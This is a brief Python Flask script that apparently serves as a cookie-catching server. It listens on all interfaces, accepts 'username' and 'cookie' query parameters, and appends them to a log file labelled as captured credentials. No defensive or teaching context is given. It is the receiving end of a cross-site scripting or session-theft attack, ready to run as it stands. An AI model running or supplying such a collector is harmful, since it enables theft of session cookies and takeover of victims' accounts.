from datetime import datetime
from flask import Flask, request
app = Flask(__name__)

log_name = "cookies.log"

def log(text):
    f = open(log_name, "a")
    f.write(text)
    f.close()

@app.route('/', methods=['GET'])
def root():
    username = request.args.get('username')
    cookie = request.args.get('cookie')
    if username and cookie:
        log("Captured username=%s cookie=%s\n" % (username, cookie))
        response = "Received username=%s cookie=%s" % (username, cookie)
    else:
        response = "Did not receieve username and cookie params"
    return response

if __name__ == '__main__':
    log("New Session Started: %s\n" % datetime.now())
    app.run(host='0.0.0.0', port=5000)